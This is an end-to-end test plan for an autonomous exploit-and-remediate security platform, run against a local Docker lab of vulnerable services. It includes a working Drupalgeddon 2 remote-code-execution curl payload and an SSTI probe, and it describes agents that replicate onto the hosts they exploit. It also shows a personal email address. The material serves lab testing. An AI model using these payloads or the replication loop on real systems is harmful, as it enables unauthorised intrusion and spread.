# End-to-End Testing Plan — TFG Autonomous Cybersecurity System

**Scope:** Manual/scripted end-to-end validation of the full autonomous loop —
bootstrap → target registration → agent deployment → scan → exploitation →
auto-replication → remediation → reporting → dashboard metrics — using the local
vulnerable lab (`lab/docker-compose.yml`).

**Assumed running:**
- API on `http://localhost:8080` (Spring Boot)
- UI on `http://localhost:4200` (Angular)
- MongoDB on `mongodb://localhost:27017`, database `tfg-system`

**Not yet running (you bring it up during Phase 2):** the vulnerable lab in `lab/`.

---

## 0. Key architectural facts this plan is built on

Read these first — they explain what a "pass" looks like, especially for remediation.

1. **Two independent flows, two different CVE concepts.**
   - **Exploitation flow** (how the agent breaks in): application-level RCE against
     the lab targets — Drupalgeddon 2 (`CVE-2018-7600`), Tomcat PUT
     (`CVE-2017-12615`), ThinkPHP RCE (`CVE-2018-20062`), Flask SSTI (no CVE),
     unauth Docker API (no CVE). Driven by `EXPLOITATION_KNOWLEDGE` + `EXECUTE_EXPLOIT`
     plan steps, backed by NVD exploit references.
   - **Remediation flow** (what the agent fixes on a host it now controls):
     service-scan driven. The agent enumerates running OS services, looks up *their*
     CVEs via NVD, and asks the API for a strategy keyed by `(cveId, operatingSystem)`.
     This is what `api/src/main/resources/remediation/strategies.json` feeds
     (openssh / nginx / apache2 / glibc / kernel). **The exploit CVE and the
     remediation CVE are not the same thing.**

2. **All lab targets are Docker containers → remediation is deliberately SKIPPED.**
   `RemediationStepHandler` runs `ContainerDetector` first; every lab image trips it
   (`/.dockerenv` + `/docker/` cgroup). The agent then reports a
   `CONTAINER-DETECTED / SKIPPED` remediation record and **never consults
   `strategies.json`**. This is the intended behavior (feature `012-docker-remediation-skip`).
   **For the lab, the correct remediation outcome is `SKIPPED`, not `SUCCESS`.**

3. **`strategies.json` is intentionally left unchanged.** Because of (2) it is
   unreachable from the lab, and its entries model OS package updates, not the
   lab's app-level exploits. See Appendix A for why, and for the two mismatches
   (container-skip + OS-string) that would have to be resolved before it could ever
   fire. No edits are made to it as part of this plan.

4. **`operatingSystem` sent by the agent is `linux-<kernel>`**, e.g.
   `linux-5.15.0-91-generic` (`RemediationStepHandler.detectOperatingSystem()` uses
   `System.getProperty("os.version")`) — not `ubuntu-22.04`. Relevant only if you
   ever pursue the non-container remediation path (Appendix A).

---

## 1. Prerequisites & environment

| Requirement | Check | Notes |
|---|---|---|
| Docker Desktop running | `docker info` | Needed for the lab. |
| API up | `curl -s localhost:8080/auth/check-setup` | Returns setup state JSON. |
| UI up | open `http://localhost:4200` | Login screen renders. |
| MongoDB reachable | `mongosh mongodb://localhost:27017/tfg-system --eval 'db.stats().db'` | Or MongoDB Compass. |
| `NVD_API_KEY` set for the API | check API env | **Strongly recommended.** NVD lookups drive both exploitation knowledge and remediation CVE discovery; without a key you are throttled to 5 req/30s and lookups may be slow/empty. |
| Agent build toolchain | `cd agents/unix && ./mvnw -q -version` | Java 17. |

> If `NVD_API_KEY` is unset, restart the API with it exported before testing the
> exploitation/vuln-lookup phases: `export NVD_API_KEY=<key>`.

### Environment variables the API reads (from `application.properties`)
`MONGODB_URI`, `MONGODB_DATABASE_NAME`, `JWT_SECRET`, `ALLOWED_ORIGINS`,
`APPLICATION_DOMAIN`, `RESEND_API_KEY` (email — optional for E2E),
`NVD_API_KEY`, `REPLICATION_PRIVATE_KEY` (has a baked default).

---

## 2. Bring up and verify the vulnerable lab

```bash
cd lab
docker compose up -d --build
docker compose ps            # all 5 services healthy
./scripts/verify-all.sh      # confirms each target is actually exploitable
```

Targets (static IPs on the `targets` bridge, host-mapped ports):

| Service   | Host URL                | Container IP  | Exploit CVE      |
|-----------|-------------------------|---------------|------------------|
| Drupal    | http://localhost:8081   | 172.20.0.10   | CVE-2018-7600    |
| Tomcat    | http://localhost:8082   | 172.20.0.11   | CVE-2017-12615   |
| Flask     | http://localhost:8000   | 172.20.0.12   | SSTI (no CVE)    |
| ThinkPHP  | http://localhost:8083   | 172.20.0.13   | CVE-2018-20062   |
| Docker API| http://localhost:2375   | 172.20.0.14   | unauth API       |

**Manual sanity spot-checks** (from `lab/playbooks/*.md`):

```bash
# Flask SSTI → expect "Hello 49"
curl -s 'http://localhost:8000/?name={{7*7}}'
# Drupal → expect uid=…(www-data)
curl -k -s 'http://localhost:8081/user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax' \
  --data 'form_id=user_register_form&_drupal_ajax=1&mail[a][#post_render][]=exec&mail[a][#type]=markup&mail[a][#markup]=id'
# Docker API → expect JSON with ApiVersion
curl -s 'http://localhost:2375/version'
```

**Pass:** every target responds with the expected exploit signature.

---

## 3. Bootstrap the platform (auth, org, project)

Do this via the UI or via API. API path shown for scriptability.

### 3.1 Initial admin setup (only once per DB)
```bash
curl -s localhost:8080/auth/check-setup            # -> {"setupComplete": false} first time
# Create the initial admin (shape per AuthenticationController /auth/setup)
curl -s -X POST localhost:8080/auth/setup -H 'Content-Type: application/json' \
  -d '{"email":"santipulido4@gmail.com","password":"<pw>","name":"Admin"}'
```

### 3.2 Login and capture JWT
```bash
TOKEN=$(curl -s -X POST localhost:8080/auth/login -H 'Content-Type: application/json' \
  -d '{"email":"santipulido4@gmail.com","password":"<pw>"}' | jq -r '.token // .accessToken')
echo "$TOKEN"
```

### 3.3 Create organization and project
```bash
ORG=$(curl -s -X POST localhost:8080/api/organizations -H "Authorization: Bearer $TOKEN" \
  -H 'Content-Type: application/json' -d '{"name":"E2E Org"}' | jq -r '.id')

PROJ=$(curl -s -X POST localhost:8080/api/projects -H "Authorization: Bearer $TOKEN" \
  -H 'Content-Type: application/json' -d "{\"name\":\"E2E Lab\",\"organizationId\":\"$ORG\"}" | jq -r '.id')
```

**Pass:** org and project IDs returned; visible under project selector in the UI.

> The project header context (`X-Organization-Id` / `X-Project-Id` or the selected
> project in the UI) scopes all subsequent target/agent/remediation queries. Keep
> `$ORG`/`$PROJ` consistent throughout.

---

## 4. Register the seed target

Register **one** lab machine as the initial foothold target (the rest get
auto-registered via replication in Phase 6). Docker API or Drupal make good seeds.

`CreateTargetRequest`: `systemName`, `description`, `os` (`LINUX`),
`organizationId`, `projectId`, optional `preauthCode`.

```bash
TARGET=$(curl -s -X POST localhost:8080/api/targets -H "Authorization: Bearer $TOKEN" \
  -H 'Content-Type: application/json' -d "{
    \"systemName\":\"lab-drupal\",
    \"description\":\"Drupal 8.5.0 CVE-2018-7600\",
    \"os\":\"LINUX\",
    \"organizationId\":\"$ORG\",
    \"projectId\":\"$PROJ\"
  }" | jq -r '.id')
```

Set the target's reachable address to the container (e.g. `172.20.0.10` /
`http://localhost:8081`) via the UI target edit or `PUT /api/targets/{id}` so the
exploitation flow has an `ipOrDomain`.

**Pass:** target listed in `GET /api/targets` and in the UI targets table.

---

## 5. Deploy an agent onto the seed host

The agent is a standalone Spring Boot / GraalVM app that polls the API every ~10s.

### 5.1 Build the agent (JVM mode is fine for E2E)
```bash
cd agents/unix && ./mvnw -q clean package
```

### 5.2 Run it against the API
```bash
java -jar target/agent-0.0.1-SNAPSHOT.jar --api.url=http://localhost:8080
```
(Or use the install-script/download flow: `GET /api/agent/download/{platform}` /
`GET /api/agent/binary/download/{installToken}` — exercises features `013`/`015`.)

### 5.3 Verify registration & heartbeat
```bash
curl -s localhost:8080/api/agent -H "Authorization: Bearer $TOKEN" | jq '.[].id'
curl -s localhost:8080/api/agent/metrics -H "Authorization: Bearer $TOKEN" | jq
```

**Pass:** the agent appears with a recent heartbeat (feature `011-agent-heartbeat-monitor`);
UI Agents view shows it `ONLINE`.

---

## 6. Assign a plan and run the autonomous loop

The agent executes an ordered plan. For a full E2E, assign a template whose steps are:

`SYSTEM_SCAN → SERVICE_SCAN → EXPLOITATION_KNOWLEDGE → EXECUTE_EXPLOIT →
REQUEST_REPLICATION → REPLICATE → SERVICE_SCAN → REMEDIATE → GENERATE_REPORT → SEND_REPORT`

### 6.1 Create/choose a template
Create via UI (Templates) or `POST /api/templates`, then assign:
```bash
curl -s -X POST "localhost:8080/api/agent/$AGENT_ID/plan/from-template/$TEMPLATE_ID" \
  -H "Authorization: Bearer $TOKEN" | jq
```
(Feature `014-assign-plan-modal`.)

### 6.2 Watch the plan advance
```bash
watch -n 3 "curl -s localhost:8080/api/agent/$AGENT_ID/plan -H 'Authorization: Bearer $TOKEN' | jq '.steps[] | {action,status}'"
```

**Pass:** steps progress `PENDING → IN_PROGRESS → COMPLETED` in order; step logs
are populated (visible via `GET /api/agent/{id}/plan` and the UI plan view).

---

## 7. Verify exploitation & auto-replication

For the seed target:

1. `EXPLOITATION_KNOWLEDGE` returns exploit scripts for the discovered service
   (`POST /api/agent/comm/exploitation-knowledge`, backed by NVD exploit refs).
2. `EXECUTE_EXPLOIT` achieves RCE (validated with the lab's 3-layer check:
   marker-file absence / container-net fingerprint / unique `/tmp/pwned_*` artifact —
   see `lab/playbooks/validation.md`).
3. `REQUEST_REPLICATION` + `REPLICATE`/`TRANSFER_AGENT` push a new agent onto the
   exploited container.
4. The exploited host is **auto-registered as a new target by hostname**
   (feature `016-exploited-target-registration`).

**Checks:**
```bash
# New target auto-registered from the exploited host
curl -s localhost:8080/api/targets -H "Authorization: Bearer $TOKEN" | jq '.[].systemName'
# New (child) agent registered and heart-beating
curl -s localhost:8080/api/agent -H "Authorization: Bearer $TOKEN" | jq 'length'
# Artifact proof on the target container
docker exec lab-drupal-1 sh -c 'ls -la /tmp/pwned_* 2>/dev/null'
```

**Pass:** child agent + auto-registered target appear; RCE artifact present on the
container.

> Repeat Phases 4–7 (or let replication fan out) to cover all five targets. Note the
> Docker API target grants host-context RCE via a privileged container — validation
> uses `chroot /mnt` per `lab/playbooks/docker-api.md`.

---

## 8. Verify remediation — **container-skip is the expected outcome**

This is the decisive remediation assertion for the lab. When the child agent (now
running *inside* a lab container) reaches `REMEDIATE`, `ContainerDetector` fires and
remediation is skipped — `strategies.json` is never consulted.

```bash
# Remediation records for this project (RemediationController)
curl -s "localhost:8080/api/remediations" -H "Authorization: Bearer $TOKEN" | jq '.content[] | {cveId,status,remediationType,skipReason}'
```

**Pass criteria (per the chosen scope):**
- A remediation record exists with:
  - `status = SKIPPED`
  - `cveId = CONTAINER-DETECTED`
  - `remediationType = CONTAINER_DETECTED`
  - `skipReason` containing `"Docker container detected"` (or the generic container
    message / inconclusive-precaution variant).
- The record's `preCheckLogs` contain the detection evidence
  (`DETECTION: runtime=docker`, `confidence=CONFIRMED`, method).
- A `REMEDIATION_COMPLETED` alert fired with severity `WARNING`
  (SKIPPED → WARNING in `RemediationServiceImpl.determineSeverity`).

**Explicit non-goal:** do **not** expect `SUCCESS`/`PENDING_REBOOT` or any
`apt-get` execution for lab targets. Seeing those would mean container detection
regressed.

### 8.1 (Optional) Confirm the strategy endpoint itself still works
Independently of the skip path, verify the knowledge base resolves a seeded entry
when queried directly (proves the data loaded and the endpoint is wired):
```bash
# Uses a seeded (cveId, os) pair from strategies.json — note os must match exactly.
curl -s -X POST localhost:8080/api/agent/comm/remediation/strategy \
  -H "Authorization: Bearer $AGENT_JWT" -H 'Content-Type: application/json' \
  -d '{"cveId":"CVE-2023-38408","operatingSystem":"ubuntu-22.04","packageName":"openssh-server","currentVersion":"1:8.9p1"}' | jq
```
**Pass:** `found=true` with `fixCommands`. This confirms seeding worked; it does **not**
represent the lab remediation path (which skips). Requires an agent-scoped JWT.

---

## 9. Verify reporting & dashboard metrics

Feature `017-reports-module` + `018-real-metrics-stats` (metrics are now real, not mock).

```bash
# Generate / list immutable reports
curl -s -X POST localhost:8080/api/reports -H "Authorization: Bearer $TOKEN" \
  -H 'Content-Type: application/json' -d "{\"projectId\":\"$PROJ\"}" | jq '.id'
curl -s localhost:8080/api/reports -H "Authorization: Bearer $TOKEN" | jq '.[].id'

# Dashboard KPIs / critical vulns / trend
curl -s localhost:8080/api/dashboard/kpis -H "Authorization: Bearer $TOKEN" | jq
curl -s localhost:8080/api/dashboard/critical-vulnerabilities -H "Authorization: Bearer $TOKEN" | jq
curl -s localhost:8080/api/dashboard/vulnerability-trend -H "Authorization: Bearer $TOKEN" | jq

# Remediation statistics (should reflect the SKIPPED count)
curl -s localhost:8080/api/remediations/statistics -H "Authorization: Bearer $TOKEN" | jq
curl -s localhost:8080/api/vulnerabilities/statistics -H "Authorization: Bearer $TOKEN" | jq
```

**Pass:**
- Dashboard KPIs reflect the real agents/targets/vulnerabilities created above
  (no mock/placeholder values).
- `remediations/statistics.byStatus.SKIPPED >= 1`; `meanTimeToRemediateSeconds`
  computed.
- Reports list contains the generated report; opening it in the UI renders findings.
- UI Dashboard, Agents, Vulnerabilities, and the remediation widget all render the
  same numbers as the API.

---

## 10. Teardown / reset between runs

```bash
cd lab && ./scripts/reset-all.sh          # or: docker compose down -v && docker compose up -d --build
# Stop agents (Ctrl-C on the java processes, or platform self-destruct SELF_DESTRUCT step)
```

To re-run cleanly against a fresh platform state, drop the relevant Mongo
collections (agents, targets, remediation_records, plans, reports). **Do not** drop
`remediation_strategies` unless you are re-seeding it (see Appendix A).

---

## 11. E2E pass/fail checklist

| # | Check | Expected |
|---|---|---|
| 1 | Lab up, all 5 targets exploitable | `verify-all.sh` green |
| 2 | Admin setup + login | JWT issued |
| 3 | Org + project created | IDs returned, visible in UI |
| 4 | Seed target registered | in `GET /api/targets` |
| 5 | Agent registers + heartbeats | `ONLINE` in UI |
| 6 | Plan steps advance in order | all `COMPLETED`, logs present |
| 7 | Exploit achieves RCE | `/tmp/pwned_*` on container |
| 8 | Auto-replication | child agent + auto-registered target |
| 9 | **Remediation SKIPPED (container)** | `CONTAINER-DETECTED / SKIPPED` record + WARNING alert |
| 10 | Strategy endpoint resolves seeded CVE | `found=true` (optional, §8.1) |
| 11 | Report generated & immutable | listed, renders in UI |
| 12 | Dashboard shows real metrics | matches API, no mocks |
| 13 | Reset restores clean lab | targets exploitable again |

---

## Appendix A — Why `strategies.json` is left unchanged (and how it *could* fire)

`strategies.json` seeds the `remediation_strategies` collection with OS-package
remediations (openssh, nginx, apache2, glibc, kernel) keyed to `ubuntu-22.04`.
It is **not** modified by this plan, because in the lab it is unreachable for two
independent reasons:

1. **Container-skip (primary).** Every lab target is a Docker container, so
   `RemediationStepHandler` short-circuits to a `CONTAINER-DETECTED / SKIPPED`
   record before any strategy lookup. This is intended behavior (feature `012`).

2. **OS-string mismatch (secondary).** Even on a non-container host, the agent
   sends `operatingSystem = "linux-" + System.getProperty("os.version")`
   (e.g. `linux-5.15.0-91-generic`), while every seeded strategy uses
   `"ubuntu-22.04"`. `findByCveIdAndOperatingSystem` would return empty →
   `FAILED (no strategy)`.

Additionally, the lab's *exploit* CVEs (Drupalgeddon, Tomcat PUT, ThinkPHP) are
application-level RCEs, not `apt`-remediable service updates, so mapping them into
`strategies.json` would be semantically wrong for this flow.

**To exercise `strategies.json` for real (out of current scope)** you would need to:
- Add a genuine (non-container) Linux VM/host target running one of the modeled
  vulnerable services (e.g. an outdated `openssh-server`), and deploy the agent on it;
- Align the strategy `operatingSystem` values with what the agent actually reports
  (`linux-<kernel>`), or normalize `detectOperatingSystem()` to emit a distro string
  like `ubuntu-22.04`;
- Re-seed the collection: `strategies.json` is only loaded when
  `remediation_strategies` is empty (`RemediationStrategyLoader`), so drop the
  collection and restart the API to pick up any edits.
